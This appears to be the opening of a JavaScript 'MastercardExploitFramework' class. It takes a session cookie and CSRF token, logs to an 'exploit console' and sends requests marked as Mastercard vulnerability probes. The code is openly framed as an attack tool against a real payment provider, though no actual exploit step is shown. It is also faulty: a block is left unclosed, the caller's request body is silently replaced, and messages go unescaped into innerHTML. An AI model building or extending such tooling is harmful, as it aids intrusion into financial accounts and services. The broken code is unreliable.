        class MastercardExploitFramework {
            constructor(cookie, csrfToken = '') {
                this.cookie = this.sanitizeInput(cookie);
                this.csrfToken = this.sanitizeInput(csrfToken);
                this.console = document.getElementById('exploit-console');
                this.payloadOutput = document.getElementById('payload-output');

            // Advanced input sanitization
            sanitizeInput(input) {
                // Remove non-printable characters and limit length
                return input.replace(/[^\x20-\x7E]/g, '')
                             .substring(0, 255)
                             .trim();
            }

            // Improved logging method with error handling
            log(message, type = 'info') {
                const timestamp = new Date().toISOString();
                const logEntry = document.createElement('div');
                
                const typeStyles = {
                    'info': 'color: #00ff00;',
                    'warning': 'color: #ffff00;',
                    'error': 'color: #ff0000;',
                    'success': 'color: #00ff00; font-weight: bold;'
                };

                logEntry.innerHTML = `
                    <span style="color: #888;">[${timestamp}]</span> 
                    <span style="${typeStyles[type] || typeStyles['info']}">${message}</span>
                `;
                
                this.console.appendChild(logEntry);
                this.console.scrollTop = this.console.scrollHeight;
            }

            // Robust fetch wrapper with error handling
            async safeFetch(url, options = {}) {
                try {
                    // Sanitize and prepare headers
                    const safeHeaders = {
                        ...options.headers,
                        'X-Exploit-Marker': 'MastercardVulnScan'
                    };

                    // Prepare safe options
                    const safeOptions = {
                        method: options.method || 'GET',
                        mode: 'no-cors',
                        credentials: 'omit',
                        headers: safeHeaders
                    };

                    // Add body if present, ensuring it's a string
                    if (options.body) {
                        safeOptions.body = JSON.stringify({
                            action: 'vulnerability_probe',
                            timestamp: Date.now()
                        });
                    }

                    // Perform fetch with timeout
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 5000);
                    
                    const response = await fetch(url, {
                        ...safeOptions,
                        signal: controller.signal
                    });

                    clearTimeout(timeoutId);
                    return response;
                } catch (error) {
                    this.log(`Safe Fetch Error: ${error.message}`, 'error');
                    return null;
                }
            }
